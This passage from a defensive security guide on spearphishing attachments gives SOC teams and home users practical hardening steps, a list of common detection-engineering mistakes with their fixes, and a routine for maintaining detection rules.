  • Phishing simulations quarterly, with real-looking attachment campaigns (harmless payloads, clear permission).
  • Alert SLA: no auto-downgrade of security alerts; critical-level rules (R1, R2) page a human.
  • Backups 3-2-1 (three copies, two media, one offline) with a tested quarterly restore.
  • Incident plan with roles from the case study, reviewed annually with a tabletop exercise.
Start here — ten quick wins for this week
  1. Turn on "Block macros from the internet" for all Office users.
  2. Enable the ASR rule "Block all Office applications from creating child processes" in audit mode today, block mode after one week.
  3. Deploy the R1 Splunk search as a real alert with a critical priority.
  4. Confirm command-line auditing (4688) is enabled domain-wide.
  5. Check DMARC on your own domains; move to p=quarantine minimum.
  6. Block .iso, .img, .one, .hta, .lnk at the mail gateway for external senders.
  7. Deploy Sysmon (community config) on every server without EDR.
  8. Add the report-phishing button and announce it loudly.
  9. Set DNS filtering to flag domains younger than 30 days.
  10. Run one test restore of one server backup. Time it.

For home users

Simple habits that stop most attacks

  • Did you expect this file? If an invoice, CV, or delivery notice arrives unexpectedly, contact the sender through a channel you already have — never the reply button.
  • Look at the real sender address, not the display name. billing@supplier-portal.co is not supplier-portal.com.
  • Never enable macros in a document that arrived by email. Real invoices do not need them.
  • Keep Windows Update and Office Update on — many attacks rely on old bugs.

Free safety nets for your devices

  • Keep built-in protection on: Microsoft Defender or your platform's equivalent, with cloud-delivered protection enabled.
  • Use a standard user account for daily work, not the administrator account.
  • Back up what matters to one offline or cloud location that malware cannot reach with your password.
  • Turn on MFA for email and banking accounts. A phished password without the second factor is usually a dead end.
07 · Common mistakes & best practices

What blue teams get wrong — and how to get it right

Every mistake below is real and common. None of them are shameful — they are growing pains of busy teams. Read them as a checklist for your own SOC, and use the fix column as your improvement backlog.

Mistake 1 — Trusting the email gateway to do everything
Why it hurtsGateways miss fresh campaigns by design: new domains, new hashes, sandboxes pending. The case study email was delivered while "verdict pending".
Do this insteadDetect the execution, not just the delivery. Rules R1–R3 and R5 assume some mail arrives — and catch it there.
Mistake 2 — Blaming the user who clicked
Why it hurtsBlame stops reporting. Users hide their clicks, evidence disappears, and the same attack repeats quietly.
Do this insteadBlameless response. Praise reports, fix the control that should have blocked the click (MOTW policy, ASR), and measure systems, not people.
Mistake 3 — Chasing file hashes only
Why it hurtsCampaign files change every few hours. A hash list from Monday is dead by Wednesday; your hunt finds nothing.
Do this insteadDetect behaviors (TTPs): Office spawning shells, temp drops, beacons. One TTP rule outlives thousands of hashes.
Mistake 4 — Letting alerts auto-close or downgrade
Why it hurtsThe case study's EDR alert died in the queue at exactly this point. The whole intrusion grew from one unreviewed ticket.
Do this insteadAlert SLA with human eyes for critical/high rules, and a weekly review of every auto-closed alert with a reason code.
Mistake 5 — No telemetry on servers (or Macs)
Why it hurtsLateral movement and macOS attacks happen where you look least. Attackers count on your blind spots.
Do this insteadKeep a log-source inventory and a coverage matrix. Deploy EDR/Sysmon to servers; add R8 for any Mac fleet and R10 for Linux desktops.
Mistake 6 — Tuning by disabling noisy rules
Why it hurtsA disabled rule is zero visibility. Next month nobody remembers why "that Office rule" was switched off.
Do this insteadTune with precise filters (exact parent-child pairs, allowlists by path) in version control, with a comment explaining each filter.
Mistake 7 — Email team and SOC working in silos
Why it hurtsThe mail team purges a campaign; the SOC never learns the sender domain; endpoint hunting never starts. Minutes become days.
Do this insteadJoint playbook: any phishing report automatically triggers endpoint retro-hunt (R1/R3) and network watchlist update (R5).
Mistake 8 — No user report loop (or a dead one)
Why it hurtsUsers are your best sensor. If reports vanish into silence, they stop sending them — and you lose your earliest warnings.
Do this insteadOne-click button, one-hour acknowledgment, and a monthly "you reported, we stopped" story in the company newsletter.
Mistake 9 — Alert fatigue from unmaintained rules
Why it hurtsFifty noisy rules train analysts to ignore everything — including the critical one. The R1 alert in the case study was ignored for this reason.
Do this insteadTrack FP rate per rule monthly. Delete or fix rules that cry wolf. Ten sharp rules beat fifty dull ones.
Mistake 10 — Never testing your detections
Why it hurtsRules drift: field names change, indexes move, a log source silently dies. You discover it during a real incident — too late.
Do this insteadPurple team quarterly (Atomic Red Team T1566.001 tests), plus a monthly synthetic event through every critical rule path.

The detection engineer's routine

Every dayEvery weekEvery monthEvery quarter
Review R1/R2 alerts first. Check the mail quarantine for risky types (TH-04). Verify EDR and Sysmon agents are reporting (a silent agent is a blind spot). Retro-hunt new intel IoCs over the last 90 days (TH-09 rhythm). Review false-positive rates and tune one rule. Read one vendor report and extract one hunting idea. Key takeaways
  • One technique, many threats. T1566.001 is an entry door: rank its concrete threats (TH-01…TH-10) and build outward from the critical ones.
  • Execution beats delivery. Email filters will miss things; the moment a macro runs, the attacker must be loud. Own that moment.
  • Rules are code. Sigma in Git, SPL tested, false positives documented, purple-teamed quarterly.
  • Layers forgive failure. MOTW macro blocking + ASR + R1/R2 alerts + DNS filtering + backups — any single layer can fail safely.
  • People finish the job. A reporting user, a blameless culture, and a rehearsed plan are as much "controls" as any firewall.
